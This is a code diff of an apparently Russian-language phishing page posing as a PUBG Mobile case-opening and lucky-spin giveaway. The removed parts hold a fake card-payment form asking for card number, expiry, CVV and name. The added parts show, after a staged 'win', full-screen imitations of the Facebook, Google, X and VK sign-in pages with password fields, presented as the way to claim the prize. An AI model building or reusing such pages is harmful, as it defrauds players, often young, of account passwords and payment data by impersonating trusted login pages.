@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>PUBG Mobile - Gift Drop</title>
+    <title>PUBG Mobile</title>
     
     <link href="https://fonts.googleapis.com/css2?family=Teko:wght@400;600;700&family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
@@ -26,13 +26,9 @@
             overflow-x: hidden;
         }
 
-        .pubg-font { 
-            font-family: 'Teko', sans-serif; 
-            text-transform: uppercase; 
-            letter-spacing: 1px; 
-        }
+        .pubg-font { font-family: 'Teko', sans-serif; text-transform: uppercase; letter-spacing: 1px; }
 
-        /* Шапка */
+        /* Шапка из скриншота */
         header {
             background: rgba(0, 0, 0, 0.9);
             padding: 12px 16px;
@@ -40,9 +36,7 @@
             justify-content: space-between;
             align-items: center;
             border-bottom: 1px solid rgba(255, 255, 255, 0.05);
-            position: sticky; 
-            top: 0; 
-            z-index: 100;
+            position: sticky; top: 0; z-index: 100;
         }
 
         .btn-deposit {
@@ -54,13 +48,11 @@
             align-items: center;
             gap: 8px;
             position: relative;
-            cursor: pointer;
         }
 
         .bonus-badge {
             position: absolute;
-            top: -10px; 
-            right: -5px;
+            top: -10px; right: -5px;
             background: #4caf50;
             font-size: 10px;
             padding: 2px 6px;
@@ -80,13 +72,10 @@
 
         .case-line {
             position: absolute;
-            top: 0; 
-            left: 50%;
-            width: 2px; 
-            height: 100%;
+            top: 0; left: 50%;
+            width: 2px; height: 100%;
             background: var(--pubg-gold);
-            z-index: 10;
-            box-shadow: 0 0 15px var(--pubg-gold);
+            z-index: 10;            box-shadow: 0 0 15px var(--pubg-gold);
         }
 
         .case-tape {
@@ -108,57 +97,11 @@
             transition: opacity 0.3s;
         }
 
-        .case-item.active { 
-            opacity: 1; 
-            transform: scale(1.1); 
-        }
-        
-        .case-item img { 
-            width: 80px; 
-            height: 80px; 
-            object-fit: contain; 
-            filter: drop-shadow(0 0 10px rgba(255,255,255,0.2)); 
-        }
-        
-        .case-item span { 
-            font-size: 11px; 
-            margin-top: 10px; 
-            font-weight: 600; 
-            text-align: center; 
-        }
+        .case-item.active { opacity: 1; transform: scale(1.1); }
+        .case-item img { width: 80px; height: 80px; object-fit: contain; filter: drop-shadow(0 0 10px rgba(255,255,255,0.2)); }
+        .case-item span { font-size: 11px; margin-top: 10px; font-weight: 600; text-align: center; }
 
-        /* Lucky Spin стили */
-        .spin-grid {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 10px;
-            margin: 20px 0;
-        }
-
-        .spin-cell {
-            aspect-ratio: 1;
-            background: #25262b;
-            border: 2px solid #35363b;
-            border-radius: 12px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 10px;
-            transition: all 0.3s;
-        }
-
-        .spin-cell.active {
-            border-color: var(--pubg-gold);
-            box-shadow: 0 0 20px var(--pubg-gold);
-        }
-
-        .spin-cell img {
-            width: 100%;
-            height: 100%;
-            object-fit: contain;
-        }
-
-        /* Кнопки */
+        /* Кнопки как на скрине */
         .error-msg {
             background: rgba(255, 59, 48, 0.15);
             color: var(--pubg-red);
@@ -182,36 +125,14 @@
             font-size: 16px;
             text-align: center;
             display: block;
-            border: none;
-            cursor: pointer;
-        }
-
-        .btn-yellow {
-            background: var(--pubg-gold);
-            color: black;
-            width: 100%;
-            padding: 16px;
-            border-radius: 14px;
-            font-weight: 700;
-            font-size: 16px;
-            text-align: center;
-            display: block;
-            border: none;
-            cursor: pointer;
-            margin-top: 15px;
         }
 
         /* Нижнее меню */
         .nav-bar {
-            position: fixed; 
-            bottom: 0; 
-            left: 0; 
-            right: 0;
+            position: fixed; bottom: 0; left: 0; right: 0;
             background: #000;
             height: 70px;
-            display: flex; 
-            justify-content: space-around; 
-            align-items: center;
+            display: flex; justify-content: space-around; align-items: center;
             border-top: 1px solid rgba(255, 255, 255, 0.05);
         }
 
@@ -222,73 +143,26 @@
             color: #555; 
             font-size: 10px;
             transition: all 0.3s;
-            cursor: pointer;
         }
-        
-        .nav-item i { 
-            font-size: 20px; 
-            margin-bottom: 4px; 
-        }
-        
-        .nav-item.active { 
-            color: var(--pubg-gold); 
-        }
+        .nav-item i { font-size: 20px; margin-bottom: 4px; }
+        .nav-item.active { color: var(--pubg-gold); }
 
-        /* Модалки оплаты */
-        .payment-modal {
-            position: fixed; 
-            inset: 0; 
-            background: rgba(0,0,0,0.95);
-            z-index: 2000; 
-            display: none; 
-            flex-direction: column; 
-            padding: 20px;
+        /* Модалки */
+        .modal {
+            position: fixed; inset: 0; background: rgba(0,0,0,0.95);
+            z-index: 1000; display: none; flex-direction: column; padding: 20px;
             justify-content: center;
         }
 
-        .payment-card {
-            background: #1a1b1e;
-            border: 2px solid var(--pubg-gold);
-            border-radius: 16px;
-            padding: 24px;
-            color: white;
-            max-width: 400px;
-            margin: 0 auto;
-            width: 100%;
-        }
-
-        .amount-option {
-            background: #25262b;
-            border: 2px solid #35363b;
-            border-radius: 12px;
-            padding: 15px;
-            margin: 10px 0;
-            cursor: pointer;
-            transition: all 0.3s;
-        }
-
-        .amount-option:hover, .amount-option.selected {
-            border-color: var(--pubg-gold);
-            background: rgba(255, 188, 0, 0.1);
-        }
-
-        .currency-flag {
-            width: 24px;
-            height: 24px;
-            border-radius: 50%;
-            margin-right: 10px;
-            object-fit: cover;
-        }
+        .login-card { background: white; color: black; border-radius: 16px; padding: 24px; }
+        input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; color: black;}
 
         /* Win Modal */
         .win-modal {
             position: fixed;
-            top: 0; 
-            left: 0; 
-            right: 0; 
-            bottom: 0;
+            top: 0; left: 0; right: 0; bottom: 0;
             background: rgba(0,0,0,0.95);
-            z-index: 3000;
+            z-index: 2000;
             display: none;
             flex-direction: column;
             justify-content: center;
@@ -313,26 +187,342 @@
             100% { box-shadow: 0 0 10px var(--pubg-gold); }
         }
 
-        /* Стили для форм карт */
-        .card-input {
+        .spin-cell {
             width: 100%;
-            padding: 14px;
-            background: #25262b;
-            border: 1px solid #35363b;
+            height: 80px;
+            object-fit: cover;
+            border-radius: 10px;
+        }
+
+        /* Стили для соцсетей */
+        .facebook-fullscreen, .google-fullscreen {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: white;
+            z-index: 3000;
+            overflow-y: auto;
+        }
+
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.7);
+            z-index: 3000;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .modal-dark {
+            background: rgba(0,0,0,0.95);
+        }
+
+        .close-modal {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            background: none;
+            border: none;
+            color: white;
+            font-size: 24px;
+            cursor: pointer;
+            z-index: 10;
+        }
+
+        /* Facebook стили */
+        .facebook-fullscreen .app-banner {
+            background: #f0f0f0;
+            padding: 10px 15px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 14px;
+            border-bottom: 1px solid #ddd;
+        }
+
+        .facebook-fullscreen .page-container {
+            padding: 20px;
+        }
+
+        .facebook-fullscreen .logo-container {
+            text-align: center;
+            margin: 30px 0;
+        }
+
+        .facebook-fullscreen .logo-container img {
+            width: 80px;
+            height: 80px;
+        }
+
+        .facebook-fullscreen .login-form {
+            margin: 20px 0;
+        }
+
+        .facebook-input {
+            width: 100%;
+            padding: 15px;
+            margin-bottom: 10px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+        }
+
+        .facebook-btn-login {
+            width: 100%;
+            background: #1877f2;
+            color: white;
+            border: none;
+            padding: 15px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: bold;
+            margin-top: 10px;
+            cursor: pointer;
+        }
+
+        .facebook-forgot-link {
+            display: block;
+            text-align: center;
+            margin: 15px 0;
+            color: #1877f2;
+            text-decoration: none;
+        }
+
+        .facebook-btn-create {
+            display: block;
+            background: #42b72a;
+            color: white;
+            text-align: center;
+            padding: 15px;
+            border-radius: 8px;
+            text-decoration: none;
+            font-weight: bold;
+            margin-top: 20px;
+        }
+
+        .facebook-footer {
+            text-align: center;
+            padding: 20px;
+            border-top: 1px solid #ddd;
+            margin-top: 30px;
+        }
+
+        .facebook-footer-links {
+            margin-top: 10px;
+            font-size: 14px;
+            color: #666;
+        }
+
+        /* Google стили */
+        .google-auth-container {
+            padding: 20px;
+            max-width: 400px;
+            margin: 0 auto;
+        }
+
+        .google-logo {
+            width: 80px;
+            height: 80px;
+            display: block;
+            margin: 20px auto;
+        }
+
+        .google-title {
+            font-size: 24px;
+            font-weight: 400;
+            text-align: center;
+            margin-bottom: 10px;
+            color: #202124;
+        }
+
+        .google-subtitle {
+            text-align: center;
+            color: #5f6368;
+            margin-bottom: 30px;
+        }
+
+        .google-input-group {
+            margin-bottom: 20px;
+        }
+
+        .google-input-label {
+            display: block;
+            color: #5f6368;
+            font-size: 14px;
+            margin-bottom: 5px;
+        }
+
+        .google-input {
+            width: 100%;
+            padding: 13px 15px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            color: #202124;
+        }
+
+        .google-btn-blue {
+            background: #1a73e8;
+            color: white;
+            border: none;
+            padding: 10px 24px;
+            border-radius: 4px;
+            font-size: 14px;
+            cursor: pointer;
+            float: right;
+        }
+
+        .google-btn-text {
+            background: none;
+            border: none;
+            color: #1a73e8;
+            padding: 10px;
+            font-size: 14px;
+            cursor: pointer;
+        }
+
+        /* Twitter/X стили */
+        .x-modal-step1, .x-modal-step2 {
+            background: #000;
+            color: white;
+            border-radius: 16px;
+            padding: 30px;
+            width: 100%;
+            max-width: 320px;
+            position: relative;
+        }
+
+        .x-logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .x-title {
+            text-align: center;
+            font-size: 23px;
+            margin-bottom: 30px;
+        }
+
+        .social-login-btn {
+            width: 100%;
+            padding: 12px;
+            border-radius: 25px;
+            border: 1px solid #536471;
+            background: black;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 15px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+
+        .social-login-btn.google {
+            border-color: #536471;
+        }
+
+        .social-login-btn.apple {
+            border-color: #536471;
+        }
+
+        .or-divider {
+            text-align: center;
+            margin: 20px 0;
+            position: relative;
+        }
+
+        .or-divider span {
+            background: black;
+            padding: 0 10px;
+            color: #71767b;
+            font-size: 15px;
+        }
+
+        .x-input {
+            width: 100%;
+            padding: 15px;
+            background: black;
+            border: 1px solid #333;
             border-radius: 8px;
             color: white;
+            margin-bottom: 20px;
             font-size: 16px;
+        }
+
+        .x-next-btn {
+            width: 100%;
+            background: white;
+            color: black;
+            border: none;
+            padding: 15px;
+            border-radius: 25px;
+            font-weight: bold;
+            font-size: 15px;
+            cursor: pointer;
+        }
+
+        /* VK стили */
+        .vk-logo {
+            width: 80px;
+            height: 80px;
+            margin: 20px auto;
+        }
+
+        .vk-title {
+            text-align: center;
+            font-size: 20px;
+            margin-bottom: 25px;
+            color: #000;
+        }
+
+        .vk-label {
+            display: block;
+            margin-bottom: 5px;
+            color: #666;
+            font-size: 14px;
+        }
+
+        .vk-input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #dce1e6;
+            border-radius: 8px;
             margin-bottom: 15px;
+            font-size: 16px;
         }
 
-        .card-input:focus {
-            outline: none;
-            border-color: var(--pubg-gold);
+        .vk-checkbox {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 20px;
         }
 
-        /* Контейнеры для секций */
-        .section {
-            padding-bottom: 80px; /* Для нижнего меню */
+        .vk-submit-btn {
+            width: 100%;
+            background: #0077ff;
+            color: white;
+            border: none;
+            padding: 15px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .vk-links {
+            text-align: center;
+            margin: 20px 0;
+        }
+
+        .vk-link {
+            color: #0077ff;
+            text-decoration: none;
+            font-size: 14px;
         }
     </style>
 </head>
@@ -345,18 +535,15 @@
             <span class="text-sm font-bold">Назад</span>
         </div>
         <div class="text-center" style="flex: 1;">
-            <h1 class="pubg-font text-lg leading-none">Gift Drop</h1>
-            <p class="text-[9px] text-gray-500 uppercase">мини-приложение</p>
+            <h1 class="pubg-font text-lg leading-none">PUBG Mobile</h1>
         </div>
-        <div class="btn-deposit" onclick="showPaymentModal()">
-            <div class="bonus-badge">+25%</div>
-            <div class="w-4 h-4 bg-blue-500 rounded-full flex items-center justify-center text-[10px]">+</div>
-            <span class="text-xs font-bold" id="balanceText">Баланс: 0 UC</span>
+        <div class="btn-deposit">
+            <span class="text-xs font-bold">Пополнить</span>
         </div>
     </header>
 
     <!-- MAIN HUB -->
-    <div id="section-hub" class="section p-4">
+    <div id="section-hub" class="p-4">
         <div class="grid grid-cols-2 gap-4 mt-4">
             <div class="bg-[#151618] p-4 rounded-2xl border border-white/5 text-center" onclick="showSection('case')">
                 <img src="ruletka1.png" class="h-32 mx-auto mb-2 rounded-xl">
@@ -369,8 +556,8 @@
         </div>
     </div>
 
-    <!-- CASE SECTION (GIFT DROP) -->
-    <div id="section-case" class="section" style="display: none;">
+    <!-- CASE SECTION -->
+    <div id="section-case" style="display: none;">
         <div class="text-center py-6">
             <h2 class="pubg-font text-3xl text-white">Classic Crate</h2>
             <p class="text-gray-500 text-xs">Moon Season Edition</p>
@@ -386,7 +573,7 @@
         <div id="errorBox" class="error-msg">Недостаточно средств для открытия кейса</div>
 
         <div id="openBtn" onclick="openCase()" class="btn-blue !bg-white !text-black mb-3">Открыть (60 UC)</div>
-        <div id="depositBtn" onclick="showPaymentModal()" class="btn-blue" style="display: none;">Пополнить баланс</div>
+        <div id="depositBtn" class="btn-blue" style="display: none;">Пополнить баланс</div>
 
         <div class="p-5">
             <h3 class="text-gray-400 uppercase text-xs font-bold mb-4">Содержимое кейса</h3>
@@ -404,150 +591,46 @@
         </div>
     </div>
 
-    <!-- SPIN SECTION (LUCKY SPIN) -->
-    <div id="section-spin" class="section" style="display: none;">
-        <div class="text-center py-6">
+    <!-- SPIN SECTION -->
+    <div id="section-spin" style="display: none;" class="p-5">
+        <div class="text-center py-4">
             <h2 class="pubg-font text-3xl text-white">Lucky Spin</h2>
             <p class="text-gray-500 text-xs">Special Edition</p>
         </div>
 
-        <div class="p-4">
-            <div class="spin-grid" id="spinGrid">
-                <!-- Сетка 3x3 для рулетки -->
-                <div class="spin-cell" data-id="0"><img src="priz1.png"></div>
-                <div class="spin-cell" data-id="1"><img src="priz2.png"></div>
-                <div class="spin-cell" data-id="2"><img src="priz3.png"></div>
-                <div class="spin-cell" data-id="7"><img src="priz4.png"></div>
-                <div class="spin-cell center-cell" data-id="center">
-                    <i class="fas fa-star text-yellow-500 text-3xl"></i>
-                </div>
-                <div class="spin-cell" data-id="3"><img src="priz5.png"></div>
-                <div class="spin-cell" data-id="6"><img src="priz6.png"></div>
-                <div class="spin-cell" data-id="5"><img src="priz7.png"></div>
-                <div class="spin-cell" data-id="4"><img src="priz8.png"></div>
+        <div class="bg-[#151618] rounded-3xl p-4 border-2 border-[#25262b] relative mb-6">
+            <div class="grid grid-cols-3 gap-3" id="spinGrid">
+                <div class="bg-[#25262b] aspect-square rounded-xl flex items-center justify-center p-2 border-2 border-transparent" id="s0"><img src="priz1.png" class="spin-cell"></div>
+                <div class="bg-[#25262b] aspect-square rounded-xl flex items-center justify-center p-2 border-2 border-transparent" id="s1"><img src="priz2.png" class="spin-cell"></div>
+                <div class="bg-[#25262b] aspect-square rounded-xl flex items-center justify-center p-2 border-2 border-transparent" id="s2"><img src="priz3.png" class="spin-cell"></div>
+                <div class="bg-[#25262b] aspect-square rounded-xl flex items-center justify-center p-2 border-2 border-transparent" id="s7"><img src="priz4.png" class="spin-cell"></div>
+                <div class="bg-[#25262b] aspect-square rounded-xl flex items-center justify-center p-2 border-2 border-transparent" id="mid"><img src="priz5.png" class="spin-cell"></div>
+                <div class="bg-[#25262b] aspect-square rounded-xl flex items-center justify-center p-2 border-2 border-transparent" id="s3"><img src="priz6.png" class="spin-cell"></div>
+                <div class="bg-[#25262b] aspect-square rounded-xl flex items-center justify-center p-2 border-2 border-transparent" id="s6"><img src="priz7.png" class="spin-cell"></div>
+                <div class="bg-[#25262b] aspect-square rounded-xl flex items-center justify-center p-2 border-2 border-transparent" id="s5"><img src="priz8.png" class="spin-cell"></div>
+                <div class="bg-[#25262b] aspect-square rounded-xl flex items-center justify-center p-2 border-2 border-transparent" id="s4"><img src="priz9.png" class="spin-cell"></div>
             </div>
-
-            <div id="spinErrorBox" class="error-msg mt-4" style="display: none;">Недостаточно средств для вращения</div>
-
-            <button id="spinBtn" class="btn-yellow !bg-yellow-500 !text-black !mt-6" onclick="startSpin()">
-                Крутить (60 UC)
-            </button>
-            <button id="spinDepositBtn" class="btn-blue !bg-blue-600 !text-white !mt-3" style="display: none;" onclick="showPaymentModal()">
-                Пополнить баланс
-            </button>
         </div>
-    </div>
-
-    <!-- MODAL ВЫБОРА СПОСОБА ОПЛАТЫ -->
-    <div id="paymentModal" class="payment-modal">
-        <div class="payment-card">
-            <h2 class="pubg-font text-2xl mb-6 text-center">Пополнение баланса</h2>
-            
-            <div class="mb-6">
-                <h3 class="text-gray-400 mb-3">Выберите страну:</h3>
-                <div class="grid grid-cols-2 gap-2">
-                    <div class="amount-option" onclick="selectCountry('RU')">
-                        <div class="flex items-center">
-                            <img src="https://flagcdn.com/w40/ru.png" class="currency-flag">
-                            <span>Россия</span>
-                        </div>
-                        <div class="text-xs text-gray-400 mt-1">RUB ₽</div>
-                    </div>
-                    <div class="amount-option" onclick="selectCountry('UA')">
-                        <div class="flex items-center">
-                            <img src="https://flagcdn.com/w40/ua.png" class="currency-flag">
-                            <span>Украина</span>
-                        </div>
-                        <div class="text-xs text-gray-400 mt-1">UAH ₴</div>
-                    </div>
-                    <div class="amount-option" onclick="selectCountry('US')">
-                        <div class="flex items-center">
-                            <img src="https://flagcdn.com/w40/us.png" class="currency-flag">
-                            <span>США</span>
-                        </div>
-                        <div class="text-xs text-gray-400 mt-1">USD $</div>
-                    </div>
-                    <div class="amount-option" onclick="selectCountry('UZ')">
-                        <div class="flex items-center">
-                            <img src="https://flagcdn.com/w40/uz.png" class="currency-flag">
-                            <span>Узбекистан</span>
-                        </div>
-                        <div class="text-xs text-gray-400 mt-1">UZS</div>
-                    </div>
-                </div>
-            </div>
-
-            <div class="mb-6">
-                <h3 class="text-gray-400 mb-3">Выберите сумму:</h3>
-                <div class="grid grid-cols-3 gap-2">
-                    <div class="amount-option text-center" onclick="selectAmount(60)">
-                        <div class="pubg-font text-lg">60 UC</div>
-                        <div class="text-xs text-gray-400" id="price60">~60 RUB</div>
-                    </div>
-                    <div class="amount-option text-center" onclick="selectAmount(300)">
-                        <div class="pubg-font text-lg">300 UC</div>
-                        <div class="text-xs text-gray-400" id="price300">~300 RUB</div>
-                    </div>
-                    <div class="amount-option text-center" onclick="selectAmount(1000)">
-                        <div class="pubg-font text-lg">1000 UC</div>
-                        <div class="text-xs text-gray-400" id="price1000">~1000 RUB</div>
-                    </div>
-                </div>
-            </div>
-
-            <button id="payButton" class="btn-yellow" onclick="processPayment()" disabled>
-                <i class="fas fa-lock mr-2"></i>Перейти к оплате
+        
+        <button id="spinBtn" class="btn-blue !mx-0 mt-6 !bg-yellow-500 !text-black !w-full" onclick="startSpin()">Крутить (60 UC)</button>
+        <button id="spinDepositBtn" class="btn-blue !mx-0 mt-3 !bg-blue-600 !text-white !w-full" style="display: none;">Пополнить баланс</button>
+        <div id="spinErrorBox" class="error-msg mt-3" style="display: none;">Недостаточно средств для вращения</div>
+        
+        <!-- Кнопки соцсетей после вращения -->
+        <div id="socialButtons" style="display: none;" class="mt-6">
+            <h3 class="text-center text-gray-400 mb-4">Войти для получения приза</h3>
+            <button onclick="showSocial('facebook')" class="w-full bg-[#1877F2] text-white p-4 rounded-xl mb-3 font-bold flex items-center justify-center gap-3">
+                <i class="fab fa-facebook-f"></i> Facebook
             </button>
-            
-            <button onclick="closePaymentModal()" class="w-full text-gray-400 text-sm mt-4">Отмена</button>
-        </div>
-    </div>
-
-    <!-- МОДАЛКА ДЛЯ КРЕДИТНОЙ КАРТЫ -->
-    <div id="cardPaymentModal" class="payment-modal">
-        <div class="payment-card">
-            <h2 class="pubg-font text-2xl mb-6 text-center">Оплата картой</h2>
-            
-            <div class="mb-4">
-                <label class="text-gray-400 text-sm mb-2 block">Номер карты</label>
-                <input type="text" id="cardNumber" class="card-input" 
-                       placeholder="0000 0000 0000 0000" maxlength="19">
-            </div>
-            
-            <div class="grid grid-cols-2 gap-4 mb-4">
-                <div>
-                    <label class="text-gray-400 text-sm mb-2 block">Срок действия</label>
-                    <input type="text" id="cardExpiry" class="card-input" 
-                           placeholder="MM/ГГ">
-                </div>
-                <div>
-                    <label class="text-gray-400 text-sm mb-2 block">CVV</label>
-                    <input type="password" id="cardCvv" class="card-input" 
-                           placeholder="123" maxlength="3">
-                </div>
-            </div>
-            
-            <div class="mb-4">
-                <label class="text-gray-400 text-sm mb-2 block">Имя на карте</label>
-                <input type="text" id="cardName" class="card-input" 
-                       placeholder="IVAN IVANOV">
-            </div>
-            
-            <div class="mb-6">
-                <label class="text-gray-400 text-sm mb-2 block">Сумма к оплате:</label>
-                <div class="text-xl font-bold text-yellow-400" id="paymentAmountText">60 UC</div>
-                <div class="text-sm text-gray-400" id="paymentCurrencyText">~60 RUB</div>
-            </div>
-            
-            <button class="btn-yellow mb-3" onclick="submitCardPayment()">
-                <i class="fas fa-credit-card mr-2"></i>Оплатить
+            <button onclick="showSocial('google')" class="w-full bg-white text-black border border-gray-200 p-4 rounded-xl mb-3 font-bold flex items-center justify-center gap-3">
+                <i class="fab fa-google"></i> Google
             </button>
-            
-            <div class="text-xs text-gray-400 text-center mb-2">
-                Нажимая кнопку, вы соглашаетесь с условиями
-            </div>
-            
-            <button onclick="closeCardPaymentModal()" class="w-full text-gray-400 text-sm">Отмена</button>
+            <button onclick="showSocial('twitter')" class="w-full bg-black text-white p-4 rounded-xl mb-3 font-bold flex items-center justify-center gap-3">
+                <i class="fab fa-twitter"></i> Twitter/X
+            </button>
+            <button onclick="showSocial('vk')" class="w-full bg-[#0077ff] text-white p-4 rounded-xl mb-3 font-bold flex items-center justify-center gap-3">
+                <i class="fab fa-vk"></i> ВКонтакте
+            </button>
         </div>
     </div>
 
@@ -557,10 +640,219 @@
             <div class="pubg-font text-2xl text-yellow-400 mb-4">ПОБЕДА!</div>
             <div class="text-xl font-bold mb-2">Вы выиграли:</div>
             <img id="winPrizeImage" src="priz1.png" class="w-32 h-32 mx-auto my-4 object-contain">
-            <div id="winPrizeName" class="pubg-font text-lg mb-6">Приз</div>
-            <button onclick="closeWinModal()" class="w-full bg-yellow-500 text-black py-3 rounded-xl font-bold">
-                Забрать приз
+            <div id="winPrizeName" class="pubg-font text-lg mb-6"></div>
+            <button onclick="showSocialAfterWin()" class="w-full bg-yellow-500 text-black py-3 rounded-xl font-bold">Получить приз</button>
+        </div>
+    </div>
+
+    <!-- Соцсети: Facebook -->
+    <div class="facebook-fullscreen" id="facebookFullscreen">
+        <!-- Баннер iOS -->
+        <div class="app-banner">
+            <svg width="20" height="20" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 11h2.59L12 16.59 8.41 13H11V8h2v5z"/></svg>
+            <span>Установите Facebook для iOS — приложение работает быстрее.</span>
+        </div>
+
+        <div class="page-container">
+            <div class="lang-selector">Русский</div>
+
+            <div class="logo-container">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" alt="FB Logo">
+            </div>
+
+            <form class="login-form" id="facebookLoginForm" onsubmit="submitSocialForm('facebook'); return false;">
+                <div class="input-group">
+                    <input type="text" id="facebookLogin" class="facebook-input" placeholder="Мобильный телефон или эл. адрес" autocomplete="username" required>
+                    <div class="facebook-error-msg" id="facebookLoginError">Введите адрес или номер телефона</div>
+                </div>
+                
+                <div class="input-group">
+                    <input type="password" id="facebookPassword" class="facebook-input" placeholder="Пароль" autocomplete="current-password" required>
+                    <div class="facebook-error-msg" id="facebookPasswordError">Введите пароль</div>
+                </div>
+
+                <button type="submit" class="facebook-btn-login">Войти</button>
+            </form>
+
+            <a href="#" class="facebook-forgot-link">Забыли пароль?</a>
+
+            <div class="create-account-container">
+                <a href="#" class="facebook-btn-create">Создать новый аккаунт</a>
+            </div>
+        </div>
+
+        <footer class="facebook-footer">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" alt="Meta" class="facebook-meta-logo">
+            <div class="facebook-footer-links">
+                Информация <span>·</span> Справка <span>·</span> Ещё
+            </div>
+        </footer>
+    </div>
+
+    <!-- Соцсети: Google -->
+    <div class="google-fullscreen" id="googleFullscreen">
+        <div class="google-auth-container" id="googleStep1">
+            <img src="Google.png" alt="Google" class="google-logo">
+            <h1 class="google-title">Sign in</h1>
+            <p class="google-subtitle">Use your Google Account</p>
+            
+            <div class="google-input-group">
+                <span class="google-input-label">Phone or email</span>
+                <input type="text" id="googleEmailInput" class="google-input" required>
+            </div>
+
+            <div class="google-guest-mode">
+                Working on someone else's computer? Use Guest mode.<br>
+                <a href="#">Learn more about using Guest mode</a>
+            </div>
+
+            <div class="google-footer-buttons">
+                <button class="google-btn-text" id="googleCreateAccountBtn">Create account</button>
+                <button class="google-btn-blue" id="googleNextBtn" onclick="googleNext()">Next</button>
+            </div>
+            
+            <div class="google-lang-footer">English</div>
+        </div>
+        
+        <!-- Страница пароля (скрыта по умолчанию) -->
+        <div class="google-auth-container" id="googleStep2" style="display:none;">
+            <img src="Google.png" alt="Google" class="google-logo">
+            
+            <div class="google-welcome-container">
+                <h1 class="google-title">Welcome!</h1>
+            </div>
+
+            <div class="google-input-group">
+                <span class="google-input-label">Enter your password</span>
+                <input type="password" id="googlePasswordInput" class="google-input" required>
+            </div>
+            
+            <div class="google-show-pass">
+                <input type="checkbox" id="googleShowPassword"> 
+                <label for="googleShowPassword">Show password</label>
+            </div>
+
+            <div class="google-footer-buttons">
+                <button class="google-btn-text" id="googleForgotPasswordBtn">Forgot password?</button>
+                <button class="google-btn-blue" id="googleSubmitBtn" onclick="submitSocialForm('google')">Next</button>
+            </div>
+            
+            <div class="google-lang-footer">English</div>
+        </div>
+        
+        <!-- Общий футер для всей страницы -->
+        <div class="google-bottom-footer">
+            <div class="google-bottom-footer-links">
+                <a href="#">Help</a>
+                <a href="#">Privacy</a>
+                <a href="#">Terms</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- Соцсети: Twitter/X -->
+    <div class="modal-overlay modal-dark" id="xModalStep1">
+        <div class="modal modal-dark x-modal-step1">
+            <button class="close-modal" onclick="closeSocial('twitter')">&times;</button>
+            <div class="x-logo">
+                <svg viewBox="0 0 24 24" aria-hidden="true" style="width: 40px; height: 40px; fill: white;">
+                    <g><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path></g>
+                </svg>
+            </div>
+            <h1 class="x-title">Sign in to X</h1>
+            
+            <button class="social-login-btn google">
+                <svg viewBox="0 0 24 24" width="18" height="18">
+                    <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
+                    <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
+                    <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
+                    <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
+                </svg>
+                Sign in with Google
             </button>
+            
+            <button class="social-login-btn apple">
+                <svg viewBox="0 0 24 24" width="18" height="18" fill="currentColor">
+                    <path d="M17.05 20.28c-.98.95-2.05.86-3.08.38-1.09-.5-2.08-.48-3.24 0-1.44.62-2.2.44-3.06-.38C2.79 15.36 3.51 7.79 9.05 7.31c1.35.07 2.29.74 3.08.8 1.18-.24 2.31-.93 3.57-.84 1.51.12 2.65.72 3.4 1.8-3.04 1.87-2.38 5.98.48 7.13-.57 1.5-1.31 2.99-2.54 4.09l.01-.01zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 4.5-3.74 4.25z"/>
+                </svg>
+                Sign in with Apple
+            </button>
+            
+            <div class="or-divider">
+                <span>or</span>
+            </div>
+            
+            <form id="xEmailForm" onsubmit="twitterNext(); return false;">
+                <input type="text" class="x-input" placeholder="Phone, email, or username" required>
+                <button type="submit" class="x-next-btn">Next</button>
+            </form>
+            
+            <a href="#" class="x-link" style="display: block; text-align: center; margin-bottom: 20px;">Forgot password?</a>
